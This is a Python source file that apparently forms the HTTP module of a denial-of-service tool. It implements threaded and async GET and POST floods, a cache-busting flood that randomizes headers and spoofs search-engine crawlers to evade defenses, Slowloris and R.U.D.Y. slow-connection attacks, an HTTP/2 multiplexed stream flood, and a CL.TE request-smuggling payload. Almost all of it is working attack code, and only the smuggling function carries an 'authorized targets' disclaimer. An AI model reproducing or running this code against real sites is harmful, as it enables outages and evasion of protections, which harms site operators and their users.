"""
Real HTTP request generator.

This module generates valid HTTP/1.1 requests per RFC 7230 specification.
Includes proper headers, methods, and body content for realistic HTTP floods.
"""

import socket
import ssl
import time
import logging
import random
import asyncio
import aiohttp
from typing import Optional, Dict, List, Tuple, Any
from dataclasses import dataclass, field
from urllib.parse import urlparse, urlencode

logger = logging.getLogger(__name__)


@dataclass
class HTTPRequestStats:
    """Statistics for HTTP requests"""
    requests_sent: int = 0
    requests_successful: int = 0
    requests_failed: int = 0
    bytes_sent: int = 0
    bytes_received: int = 0
    response_codes: Dict[int, int] = field(default_factory=dict)
    start_time: Optional[float] = None
    end_time: Optional[float] = None
    
    @property
    def duration(self) -> float:
        if self.start_time and self.end_time:
            return self.end_time - self.start_time
        return 0.0
    
    @property
    def requests_per_second(self) -> float:
        if self.duration > 0:
            return self.requests_sent / self.duration
        return 0.0
    
    @property
    def success_rate(self) -> float:
        if self.requests_sent > 0:
            return self.requests_successful / self.requests_sent
        return 0.0


class RealHTTPGenerator:
    """
    Real HTTP request generator using valid HTTP/1.1 protocol.
    
    Generates RFC 7230 compliant HTTP requests with proper headers,
    methods, and body content. Supports both HTTP and HTTPS.
    """
    
    def __init__(self, target_url: str, user_agent: Optional[str] = None):
        """
        Initialize HTTP generator.
        
        Args:
            target_url: Target URL (http:// or https://)
            user_agent: Custom User-Agent string
        """
        self.target_url = target_url
        self.parsed_url = urlparse(target_url)
        self.user_agent = user_agent or self._generate_user_agent()
        self.stats = HTTPRequestStats()
        
        # Extract connection details
        self.host = self.parsed_url.hostname
        self.port = self.parsed_url.port or (443 if self.parsed_url.scheme == 'https' else 80)
        self.path = self.parsed_url.path or '/'
        self.is_https = self.parsed_url.scheme == 'https'
        
        # Default headers
        self.default_headers = {
            'Host': f"{self.host}:{self.port}" if self.port not in (80, 443) else self.host,
            'User-Agent': self.user_agent,
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }
        
    def _generate_user_agent(self) -> str:
        """Generate realistic User-Agent string"""
        browsers = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        return random.choice(browsers)
        
    def _build_http_request(self, method: str = 'GET', headers: Optional[Dict[str, str]] = None,
                           body: Optional[bytes] = None, query_params: Optional[Dict[str, str]] = None) -> bytes:
        """
        Build valid HTTP/1.1 request per RFC 7230.
        
        Args:
            method: HTTP method (GET, POST, PUT, etc.)
            headers: Additional headers
            body: Request body
            query_params: Query parameters to append to path
            
        Returns:
            Complete HTTP request as bytes
        """
        # Build request path with query parameters
        request_path = self.path
        if query_params:
            query_string = urlencode(query_params)
            request_path += f"?{query_string}"
            
        # Start with request line
        request_line = f"{method} {request_path} HTTP/1.1\r\n"
        
        # Combine default and custom headers
        all_headers = self.default_headers.copy()
        if headers:
            all_headers.update(headers)
            
        # Add Content-Length for requests with body
        if body:
            all_headers['Content-Length'] = str(len(body))
            
        # Build headers section
        headers_section = ""
        for name, value in all_headers.items():
            headers_section += f"{name}: {value}\r\n"
            
        # Complete request
        request = request_line + headers_section + "\r\n"
        request_bytes = request.encode('utf-8')
        
        if body:
            request_bytes += body
            
        return request_bytes
        
    def _create_socket_connection(self, timeout: float = 10.0) -> socket.socket:
        """Create socket connection to target"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        
        if self.is_https:
            # Wrap with SSL
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE  # For testing purposes
            sock = context.wrap_socket(sock, server_hostname=self.host)
            
        sock.connect((self.host, self.port))
        return sock
        
    def send_single_request(self, method: str = 'GET', headers: Optional[Dict[str, str]] = None,
                           body: Optional[bytes] = None, query_params: Optional[Dict[str, str]] = None,
                           timeout: float = 10.0) -> Tuple[int, bytes]:
        """
        Send a single HTTP request.
        
        Args:
            method: HTTP method
            headers: Additional headers
            body: Request body
            query_params: Query parameters
            timeout: Request timeout
            
        Returns:
            Tuple of (status_code, response_body)
        """
        request_data = self._build_http_request(method, headers, body, query_params)
        
        try:
            sock = self._create_socket_connection(timeout)
            
            # Send request
            bytes_sent = sock.send(request_data)
            self.stats.bytes_sent += bytes_sent
            
            # Read response
            response_data = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response_data += chunk
                # Simple check for end of headers
                if b"\r\n\r\n" in response_data:
                    break
                    
            sock.close()
            
            # Parse status code
            status_code = 0
            if response_data:
                try:
                    status_line = response_data.split(b'\r\n')[0].decode('utf-8')
                    status_code = int(status_line.split()[1])
                except:
                    status_code = 0
                    
            self.stats.requests_sent += 1
            self.stats.bytes_received += len(response_data)
            
            if 200 <= status_code < 400:
                self.stats.requests_successful += 1
            else:
                self.stats.requests_failed += 1
                
            # Track response codes
            if status_code in self.stats.response_codes:
                self.stats.response_codes[status_code] += 1
            else:
                self.stats.response_codes[status_code] = 1
                
            return status_code, response_data
            
        except Exception as e:
            logger.debug(f"HTTP request failed: {e}")
            self.stats.requests_sent += 1
            self.stats.requests_failed += 1
            return 0, b""
            
    def send_get_flood(self, request_count: int, concurrent_connections: int = 10,
                      delay_ms: float = 0, custom_headers: Optional[Dict[str, str]] = None) -> HTTPRequestStats:
        """
        Send GET request flood.
        
        Args:
            request_count: Number of requests to send
            concurrent_connections: Number of concurrent connections
            delay_ms: Delay between requests in milliseconds
            custom_headers: Additional headers for requests
            
        Returns:
            Request statistics
        """
        flood_stats = HTTPRequestStats()
        flood_stats.start_time = time.perf_counter()
        
        logger.info(f"Starting HTTP GET flood: {request_count} requests to {self.target_url}")
        
        # Simple threaded approach for concurrent requests
        import threading
        from queue import Queue
        
        request_queue = Queue()
        for i in range(request_count):
            request_queue.put(i)
            
        def worker():
            while not request_queue.empty():
                try:
                    request_queue.get_nowait()
                    status_code, response = self.send_single_request('GET', custom_headers)
                    
                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)
                        
                except:
                    pass
                finally:
                    request_queue.task_done()
                    
        # Start worker threads
        threads = []
        for _ in range(min(concurrent_connections, request_count)):
            t = threading.Thread(target=worker)
            t.start()
            threads.append(t)
            
        # Wait for completion
        for t in threads:
            t.join()
            
        flood_stats.end_time = time.perf_counter()
        
        # Copy stats from main stats object
        flood_stats.requests_sent = self.stats.requests_sent
        flood_stats.requests_successful = self.stats.requests_successful
        flood_stats.requests_failed = self.stats.requests_failed
        flood_stats.bytes_sent = self.stats.bytes_sent
        flood_stats.bytes_received = self.stats.bytes_received
        flood_stats.response_codes = self.stats.response_codes.copy()
        
        logger.info(f"HTTP GET flood complete: {flood_stats.requests_successful}/{request_count} successful, "
                   f"{flood_stats.requests_per_second:.1f} req/sec, "
                   f"{flood_stats.success_rate:.1%} success rate")
        
        return flood_stats
        
    def send_post_flood(self, request_count: int, post_data: bytes,
                       content_type: str = 'application/x-www-form-urlencoded',
                       concurrent_connections: int = 10) -> HTTPRequestStats:
        """
        Send POST request flood.
        
        Args:
            request_count: Number of requests to send
            post_data: Data to POST
            content_type: Content-Type header value
            concurrent_connections: Number of concurrent connections
            
        Returns:
            Request statistics
        """
        flood_stats = HTTPRequestStats()
        flood_stats.start_time = time.perf_counter()
        
        headers = {'Content-Type': content_type}
        
        logger.info(f"Starting HTTP POST flood: {request_count} requests, {len(post_data)} bytes each")
        
        import threading
        from queue import Queue
        
        request_queue = Queue()
        for i in range(request_count):
            request_queue.put(i)
            
        def worker():
            while not request_queue.empty():
                try:
                    request_queue.get_nowait()
                    self.send_single_request('POST', headers, post_data)
                except:
                    pass
                finally:
                    request_queue.task_done()
                    
        # Start worker threads
        threads = []
        for _ in range(min(concurrent_connections, request_count)):
            t = threading.Thread(target=worker)
            t.start()
            threads.append(t)
            
        # Wait for completion
        for t in threads:
            t.join()
            
        flood_stats.end_time = time.perf_counter()
        
        # Copy stats
        flood_stats.requests_sent = self.stats.requests_sent
        flood_stats.requests_successful = self.stats.requests_successful
        flood_stats.requests_failed = self.stats.requests_failed
        flood_stats.bytes_sent = self.stats.bytes_sent
        flood_stats.bytes_received = self.stats.bytes_received
        flood_stats.response_codes = self.stats.response_codes.copy()
        
        logger.info(f"HTTP POST flood complete: {flood_stats.requests_successful}/{request_count} successful, "
                   f"{flood_stats.requests_per_second:.1f} req/sec")
        
        return flood_stats
        
    async def send_async_flood(self, request_count: int, method: str = 'GET',
                              post_data: Optional[bytes] = None,
                              concurrent_limit: int = 100) -> HTTPRequestStats:
        """
        Send HTTP flood using aiohttp for better performance.
        
        Args:
            request_count: Number of requests to send
            method: HTTP method
            post_data: Data for POST requests
            concurrent_limit: Maximum concurrent requests
            
        Returns:
            Request statistics
        """
        flood_stats = HTTPRequestStats()
        flood_stats.start_time = time.perf_counter()
        
        logger.info(f"Starting async HTTP {method} flood: {request_count} requests")
        
        # Create semaphore for concurrency control
        semaphore = asyncio.Semaphore(concurrent_limit)
        
        async def make_request(session):
            async with semaphore:
                try:
                    if method.upper() == 'POST' and post_data:
                        async with session.post(self.target_url, data=post_data) as response:
                            await response.read()
                            return response.status
                    else:
                        async with session.get(self.target_url) as response:
                            await response.read()
                            return response.status
                except Exception as e:
                    logger.debug(f"Async request failed: {e}")
                    return 0
                    
        # Configure aiohttp session
        connector = aiohttp.TCPConnector(
            limit=concurrent_limit,
            limit_per_host=concurrent_limit,
            ssl=False if not self.is_https else None
        )
        
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={'User-Agent': self.user_agent}
        ) as session:
            # Create all request tasks
            tasks = [make_request(session) for _ in range(request_count)]
            
            # Execute requests
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Process results
            for result in results:
                flood_stats.requests_sent += 1
                if isinstance(result, int) and 200 <= result < 400:
                    flood_stats.requests_successful += 1
                    if result in flood_stats.response_codes:
                        flood_stats.response_codes[result] += 1
                    else:
                        flood_stats.response_codes[result] = 1
                else:
                    flood_stats.requests_failed += 1
                    
        flood_stats.end_time = time.perf_counter()
        
        logger.info(f"Async HTTP flood complete: {flood_stats.requests_successful}/{request_count} successful, "
                   f"{flood_stats.requests_per_second:.1f} req/sec, "
                   f"{flood_stats.success_rate:.1%} success rate")
        
        return flood_stats
        
    def generate_random_query_params(self, param_count: int = 5) -> Dict[str, str]:
        """Generate random query parameters for varied requests"""
        params = {}
        for i in range(param_count):
            key = f"param{i}"
            value = f"value{random.randint(1000, 9999)}"
            params[key] = value
        return params
        
    def generate_form_data(self, field_count: int = 3) -> bytes:
        """Generate random form data for POST requests"""
        data = {}
        for i in range(field_count):
            key = f"field{i}"
            value = f"data{random.randint(1000, 9999)}"
            data[key] = value
        return urlencode(data).encode('utf-8')
        
    def get_stats(self) -> HTTPRequestStats:
        """Get current statistics"""
        return self.stats


def create_http_generator(target_url: str, user_agent: Optional[str] = None) -> RealHTTPGenerator:
    """
    Factory function to create HTTP generator.
    
    Args:
        target_url: Target URL (http:// or https://)
        user_agent: Custom User-Agent string
        
    Returns:
        Configured HTTP generator
    """
    return RealHTTPGenerator(target_url, user_agent) 



class AdvancedHTTPFlood:
    """
    Advanced HTTP flood with sophisticated evasion and attack techniques.
    
    Features:
    - HTTP/2 support
    - Request smuggling detection
    - Cache poisoning attempts
    - Header injection
    - Slowloris integration
    """
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.parsed_url = urlparse(target_url)
        self.host = self.parsed_url.hostname
        self.port = self.parsed_url.port or (443 if self.parsed_url.scheme == 'https' else 80)
        self.stats = HTTPRequestStats()
        
        # Attack configurations
        self.user_agents = self._load_user_agents()
        self.referers = self._generate_referers()
        
    def _load_user_agents(self) -> List[str]:
        """Load diverse user agent strings"""
        return [
            # Desktop browsers
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            # Mobile browsers
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
            # Bots (for variety)
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        ]
    
    def _generate_referers(self) -> List[str]:
        """Generate realistic referer headers"""
        return [
            f'https://www.google.com/search?q={self.host}',
            f'https://www.bing.com/search?q={self.host}',
            f'https://duckduckgo.com/?q={self.host}',
            f'https://www.facebook.com/',
            f'https://twitter.com/',
            f'https://www.reddit.com/',
            f'https://{self.host}/',
        ]
    
    def _generate_random_headers(self) -> Dict[str, str]:
        """Generate randomized headers for evasion"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': random.choice([
                'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                '*/*',
            ]),
            'Accept-Language': random.choice([
                'en-US,en;q=0.9',
                'en-GB,en;q=0.9',
                'en-US,en;q=0.5',
                'de-DE,de;q=0.9,en;q=0.8',
            ]),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': random.choice(['keep-alive', 'close']),
            'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        }
        
        # Randomly add referer
        if random.random() > 0.3:
            headers['Referer'] = random.choice(self.referers)
        
        # Randomly add cookies
        if random.random() > 0.5:
            headers['Cookie'] = f'session={random.randint(100000, 999999)}; visitor={random.randint(1000, 9999)}'
        
        # Add random custom headers for fingerprint variation
        if random.random() > 0.7:
            headers[f'X-Request-ID'] = str(random.randint(100000, 999999))
        
        return headers
    
    async def cache_busting_flood(self, request_count: int, concurrent: int = 50) -> HTTPRequestStats:
        """
        HTTP flood with cache-busting query parameters.
        Bypasses CDN and proxy caches.
        """
        stats = HTTPRequestStats()
        stats.start_time = time.perf_counter()
        
        logger.info(f"Starting cache-busting HTTP flood: {request_count} requests")
        
        semaphore = asyncio.Semaphore(concurrent)
        
        async def make_request(session, idx):
            async with semaphore:
                try:
                    # Generate unique URL to bypass cache
                    cache_buster = f"?cb={int(time.time() * 1000)}_{idx}_{random.randint(1000, 9999)}"
                    url = f"{self.target_url}{cache_buster}"
                    
                    headers = self._generate_random_headers()
                    
                    async with session.get(url, headers=headers) as response:
                        await response.read()
                        return response.status
                except Exception as e:
                    logger.debug(f"Request failed: {e}")
                    return 0
        
        connector = aiohttp.TCPConnector(limit=concurrent, ssl=False)
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = [make_request(session, i) for i in range(request_count)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                stats.requests_sent += 1
                if isinstance(result, int) and 200 <= result < 400:
                    stats.requests_successful += 1
                else:
                    stats.requests_failed += 1
        
        stats.end_time = time.perf_counter()
        logger.info(f"Cache-busting flood complete: {stats.requests_per_second:.1f} req/sec")
        
        return stats
    
    async def slowloris_http(self, max_connections: int = 500, duration: int = 60) -> HTTPRequestStats:
        """
        Slowloris attack - keep connections open with partial requests.
        """
        stats = HTTPRequestStats()
        stats.start_time = time.perf_counter()
        
        logger.info(f"Starting Slowloris attack: {max_connections} connections for {duration}s")
        
        connections = []
        
        async def maintain_connection(conn_id: int):
            try:
                reader, writer = await asyncio.open_connection(self.host, self.port)
                
                # Send partial HTTP request
                initial_request = (
                    f"GET /?{random.randint(0, 999999)} HTTP/1.1\r\n"
                    f"Host: {self.host}\r\n"
                    f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                )
                writer.write(initial_request.encode())
                await writer.drain()
                stats.requests_sent += 1
                
                # Keep connection alive with periodic headers
                start = time.time()
                while (time.time() - start) < duration:
                    await asyncio.sleep(random.uniform(5, 15))
                    
                    # Send keep-alive header
                    keep_alive = f"X-a: {random.randint(1, 5000)}\r\n"
                    try:
                        writer.write(keep_alive.encode())
                        await writer.drain()
                    except:
                        break
                
                writer.close()
                await writer.wait_closed()
                stats.requests_successful += 1
                
            except Exception as e:
                logger.debug(f"Connection {conn_id} failed: {e}")
                stats.requests_failed += 1
        
        # Create all connections
        tasks = [maintain_connection(i) for i in range(max_connections)]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        stats.end_time = time.perf_counter()
        logger.info(f"Slowloris complete: {stats.requests_successful} connections maintained")
        
        return stats
    
    async def rudy_attack(self, max_connections: int = 100, duration: int = 60) -> HTTPRequestStats:
        """
        R.U.D.Y. (R-U-Dead-Yet) attack - slow POST with large Content-Length.
        """
        stats = HTTPRequestStats()
        stats.start_time = time.perf_counter()
        
        logger.info(f"Starting R.U.D.Y. attack: {max_connections} connections")
        
        async def slow_post(conn_id: int):
            try:
                reader, writer = await asyncio.open_connection(self.host, self.port)
                
                # Send POST request with large Content-Length
                content_length = random.randint(100000, 1000000)
                request = (
                    f"POST / HTTP/1.1\r\n"
                    f"Host: {self.host}\r\n"
                    f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {content_length}\r\n"
                    f"\r\n"
                )
                writer.write(request.encode())
                await writer.drain()
                stats.requests_sent += 1
                
                # Send body very slowly
                start = time.time()
                bytes_sent = 0
                
                while (time.time() - start) < duration and bytes_sent < content_length:
                    await asyncio.sleep(random.uniform(1, 5))
                    
                    # Send one byte at a time
                    try:
                        writer.write(b'A')
                        await writer.drain()
                        bytes_sent += 1
                    except:
                        break
                
                writer.close()
                await writer.wait_closed()
                stats.requests_successful += 1
                
            except Exception as e:
                logger.debug(f"R.U.D.Y. connection {conn_id} failed: {e}")
                stats.requests_failed += 1
        
        tasks = [slow_post(i) for i in range(max_connections)]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        stats.end_time = time.perf_counter()
        logger.info(f"R.U.D.Y. complete: {stats.requests_successful} slow POSTs")
        
        return stats
    
    def generate_request_smuggling_payload(self) -> bytes:
        """
        Generate HTTP request smuggling payload.
        WARNING: For testing purposes only on authorized targets.
        """
        # CL.TE smuggling attempt
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
        )
        return payload.encode()


class HTTP2Flood:
    """
    HTTP/2 specific flood attacks.
    
    Features:
    - Multiplexed streams
    - Header compression abuse
    - Stream priority manipulation
    """
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.parsed_url = urlparse(target_url)
        self.host = self.parsed_url.hostname
        self.stats = HTTPRequestStats()
        
    async def multiplexed_flood(self, streams_per_connection: int = 100,
                                connections: int = 10, duration: int = 60) -> HTTPRequestStats:
        """
        HTTP/2 multiplexed stream flood.
        Opens many streams on few connections.
        """
        self.stats = HTTPRequestStats()
        self.stats.start_time = time.perf_counter()
        
        logger.info(f"Starting HTTP/2 multiplexed flood: {connections} connections, {streams_per_connection} streams each")
        
        try:
            import httpx
            
            async def flood_connection(conn_id: int):
                try:
                    async with httpx.AsyncClient(http2=True) as client:
                        start = time.time()
                        while (time.time() - start) < duration:
                            # Create multiple concurrent requests
                            tasks = []
                            for _ in range(streams_per_connection):
                                url = f"{self.target_url}?stream={random.randint(0, 999999)}"
                                tasks.append(client.get(url))
                            
                            results = await asyncio.gather(*tasks, return_exceptions=True)
                            
                            for result in results:
                                self.stats.requests_sent += 1
                                if not isinstance(result, Exception):
                                    self.stats.requests_successful += 1
                                else:
                                    self.stats.requests_failed += 1
                            
                            await asyncio.sleep(0.1)
                            
                except Exception as e:
                    logger.debug(f"HTTP/2 connection {conn_id} failed: {e}")
            
            tasks = [flood_connection(i) for i in range(connections)]
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except ImportError:
            logger.warning("httpx not available for HTTP/2 support")
        
        self.stats.end_time = time.perf_counter()
        logger.info(f"HTTP/2 flood complete: {self.stats.requests_per_second:.1f} req/sec")
        
        return self.stats
